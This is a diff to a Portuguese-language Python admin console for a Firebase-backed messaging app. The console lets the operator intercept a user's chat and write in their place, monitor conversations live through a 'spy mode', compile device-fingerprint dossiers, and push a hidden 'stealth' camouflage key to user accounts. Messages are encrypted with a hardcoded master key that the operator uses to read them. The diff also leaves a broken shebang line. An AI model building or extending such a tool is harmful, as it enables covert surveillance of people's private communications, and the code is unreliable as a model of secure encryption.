@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+3#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 import os
@@ -15,11 +15,53 @@ import traceback
 
 # Using native pycryptodome if available, else fallback for AES
 try:
+    # pyrefly: ignore [missing-import]
     from Crypto.Cipher import AES
+    # pyrefly: ignore [missing-import]
     from Crypto.Util.Padding import pad, unpad
     CRYPTO_AVAILABLE = True
 except ImportError:
     CRYPTO_AVAILABLE = False
+
+SECRET_KEY = "CHAVE_SECRETA_SUPER_FODA_AES"
+
+def decrypt_cryptojs(encrypted_b64, passphrase):
+    try:
+        data = base64.b64decode(encrypted_b64)
+        if data[:8] != b'Salted__': return encrypted_b64
+        salt = data[8:16]
+        key_iv = bytes()
+        prev = bytes()
+        while len(key_iv) < 48:
+            prev = hashlib.md5(prev + passphrase.encode('utf-8') + salt).digest()
+            key_iv += prev
+        key = key_iv[:32]
+        iv = key_iv[32:48]
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        decrypted = cipher.decrypt(data[16:])
+        padding_len = decrypted[-1]
+        return decrypted[:-padding_len].decode('utf-8')
+    except Exception:
+        return f"[ERRO DECRYPT] {encrypted_b64[:20]}..."
+
+def encrypt_cryptojs(text, passphrase):
+    try:
+        salt = os.urandom(8)
+        key_iv = bytes()
+        prev = bytes()
+        while len(key_iv) < 48:
+            prev = hashlib.md5(prev + passphrase.encode('utf-8') + salt).digest()
+            key_iv += prev
+        key = key_iv[:32]
+        iv = key_iv[32:48]
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        text_bytes = text.encode('utf-8')
+        padding_len = 16 - (len(text_bytes) % 16)
+        padded_text = text_bytes + bytes([padding_len] * padding_len)
+        encrypted = cipher.encrypt(padded_text)
+        return base64.b64encode(b'Salted__' + salt + encrypted).decode('utf-8')
+    except Exception:
+        return text
 
 class Colors:
     RED = "\033[31m"
@@ -167,10 +209,7 @@ def terminal_chat(target_user):
                                 # Admin tenta descriptografar pois o app agora manda AES
                                 try:
                                     if enc_text.startswith("U2Fz"): # Base64 signature for AES
-                                        ct = base64.b64decode(enc_text)
-                                        cipher = AES.new(SECRET_KEY, AES.MODE_ECB)
-                                        pt = unpad(cipher.decrypt(ct), AES.block_size)
-                                        decrypted = pt.decode('utf-8')
+                                        decrypted = decrypt_cryptojs(enc_text, SECRET_KEY)
                                     else:
                                         decrypted = enc_text
                                 except Exception:
@@ -196,10 +235,11 @@ def terminal_chat(target_user):
                 break
             
             if msg.strip():
-                # Envia mensagem em texto limpo para gaveta do alvo
+                # Envia mensagem CRIPTOGRAFADA para gaveta do alvo
+                encrypted_msg = encrypt_cryptojs(msg.strip(), SECRET_KEY)
                 payload = {
                     "sender": me,
-                    "text": msg.strip(),
+                    "text": encrypted_msg,
                     "timestamp": time.time(),
                     "type": "text"
                 }
@@ -256,8 +296,14 @@ def _send_expo_push(token: str, title: str, body: str) -> tuple:
         return False, str(e)
 
 def format_ts(ts):
-    if not ts: return "N/A"
-    return datetime.fromtimestamp(float(ts)).strftime('%d/%m/%Y %H:%M:%S')
+    try:
+        val = float(ts)
+        # Se for maior que 20 bilhões, é milissegundos.
+        if val > 20000000000:
+            val = val / 1000.0
+        return datetime.fromtimestamp(val).strftime('%d/%m/%Y %H:%M:%S')
+    except Exception:
+        return str(ts)
 
 def user_dossier(user_input=None):
     user = user_input
@@ -337,6 +383,17 @@ def user_dossier(user_input=None):
 
         else:
             print(f"\n{Colors.YELLOW}[!] Nenhum fingerprint de dispositivo registrado.{Colors.RESET}")
+            
+        store_activity = data.get("store_activity")
+        if store_activity:
+            print(f"\n{Colors.YELLOW}[!] HISTÓRICO DA LOJA SECRETA{Colors.RESET}")
+            # order by timestamp
+            activities = sorted(store_activity.values(), key=lambda x: x.get('timestamp', 0))
+            for act in activities:
+                print(f"    ├─ [{format_ts(act.get('timestamp'))}] Produto: {Colors.CYAN}{act.get('title')}{Colors.RESET} | Preço: {Colors.GREEN}{act.get('price')}{Colors.RESET}")
+            print(f"    └─ Total de Interações: {len(activities)}")
+        else:
+            print(f"\n{Colors.YELLOW}[!] Nenhuma interação na Loja registrada.{Colors.RESET}")
         
     else:
         print(f"{Colors.RED}Usuário não encontrado.{Colors.RESET}")
@@ -404,6 +461,7 @@ def user_management_submenu():
                 print(f" {Colors.CYAN}4.{Colors.RESET} Remover Conta Permanentemente")
                 print(f" {Colors.BRIGHT_MAGENTA}5.{Colors.RESET} Interceptar Sessão (Terminal Chat)")
                 print(f" {Colors.YELLOW}6.{Colors.RESET} MODO ESPIÃO (Monitorar Conversas Ao Vivo)")
+                print(f" {Colors.CYAN}7.{Colors.RESET} Configurar Chave Camuflagem (Stealth Mode)")
                 print(f" {Colors.WHITE}0.{Colors.RESET} Voltar à Pesquisa")
                 
                 sub_opt = input("\n> ")
@@ -437,6 +495,13 @@ def user_management_submenu():
                     terminal_chat(user)
                 elif sub_opt == "6":
                     spy_mode(user)
+                elif sub_opt == "7":
+                    new_key = input("Digite a nova chave (ex: admin123): ").strip()
+                    if new_key:
+                        _firebase_req(f"users/{user}/settings/stealthKey", method="PUT", data=new_key)
+                        print(f"{Colors.GREEN}Chave Stealth configurada para {new_key}!{Colors.RESET}")
+                        print(f"{Colors.YELLOW}[!] O usuário deve fazer login pelo menos uma vez para o app baixar essa chave.{Colors.RESET}")
+                    input("\nPressione ENTER...")
         else:
             print(f"\n{Colors.YELLOW}Usuário não encontrado. Deseja criar?{Colors.RESET}")
             ans = input("(s/n): ").strip().lower()
@@ -488,10 +553,7 @@ def spy_mode(user):
                         # Tenta descriptografar usando a chave mestre
                         try:
                             if enc_text.startswith("U2Fz"):
-                                ct = base64.b64decode(enc_text)
-                                cipher = AES.new(SECRET_KEY, AES.MODE_ECB)
-                                pt = unpad(cipher.decrypt(ct), AES.block_size)
-                                text = pt.decode('utf-8')
+                                text = decrypt_cryptojs(enc_text, SECRET_KEY)
                             else:
                                 text = enc_text
                         except Exception:
@@ -567,18 +629,75 @@ def system_announcements():
                 print(f"{Colors.GREEN}Sistema de Atualização (OTA) ativado para v{version}!{Colors.RESET}")
             input("\nPressione ENTER...")
 
+def store_management_submenu():
+    while True:
+        clear_screen()
+        print_banner()
+        print(f"{Colors.BOLD}[ GERENCIAMENTO DA LOJA SECRETA ]{Colors.RESET}\n")
+        
+        st, items = _firebase_req("app_config/store_items")
+        store_items = items if st == 200 and items else {}
+        items_list = []
+        for k, v in store_items.items():
+            if isinstance(v, dict):
+                v['id'] = k
+                items_list.append(v)
+                
+        print(f" {Colors.CYAN}Produtos Atuais:{Colors.RESET}")
+        if not items_list:
+            print("  Nenhum produto cadastrado.")
+        else:
+            for idx, prod in enumerate(items_list):
+                print(f"  [{idx+1}] {prod.get('title')} - {prod.get('price')}")
+                
+        print(f"\n {Colors.CYAN}1.{Colors.RESET} Adicionar Novo Produto")
+        print(f" {Colors.CYAN}2.{Colors.RESET} Remover Produto")
+        print(f" {Colors.WHITE}0.{Colors.RESET} Voltar")
+        
+        opt = input("\nSelecione uma operação: ")
+        
+        if opt == "0": break
+        elif opt == "1":
+            title = input("Título do Produto: ").strip()
+            desc = input("Descrição Curta: ").strip()
+            price = input("Preço (ex: R$ 50,00): ").strip()
+            url = input("Link de Checkout (MisticPay): ").strip()
+            
+            import uuid
+            new_id = f"item_{str(uuid.uuid4())[:8]}"
+            payload = {"title": title, "desc": desc, "price": price, "url": url}
+            
+            _firebase_req(f"app_config/store_items/{new_id}", method="PUT", data=payload)
+            print(f"{Colors.GREEN}Produto adicionado com sucesso!{Colors.RESET}")
+            input("\nPressione ENTER...")
+            
+        elif opt == "2":
+            try:
+                idx_remove = int(input("Número do produto para apagar: ").strip()) - 1
+                if 0 <= idx_remove < len(items_list):
+                    del_id = items_list[idx_remove]['id']
+                    _firebase_req(f"app_config/store_items/{del_id}", method="DELETE")
+                    print(f"{Colors.GREEN}Produto removido!{Colors.RESET}")
+                else:
+                    print(f"{Colors.RED}Opção inválida.{Colors.RESET}")
+            except ValueError:
+                print(f"{Colors.RED}Número inválido.{Colors.RESET}")
+            input("\nPressione ENTER...")
+
 def main_menu():
     while True:
         clear_screen()
         print_banner()
         print(f" {Colors.CYAN}1.{Colors.RESET} Gerenciar Usuários e Dispositivos")
-        print(f" {Colors.CYAN}2.{Colors.RESET} Comunicados e Push Notifications")
+        print(f" {Colors.CYAN}2.{Colors.RESET} Comunicados e Atualizações")
+        print(f" {Colors.CYAN}3.{Colors.RESET} Loja Secreta (Gerenciar Produtos)")
         print(f" {Colors.WHITE}0.{Colors.RESET} Sair")
         
         opt = input("\nSelecione uma operação: ")
         
         if opt == "1": user_management_submenu()
         elif opt == "2": system_announcements()
+        elif opt == "3": store_management_submenu()
         elif opt == "0": break
 
 if __name__ == "__main__":
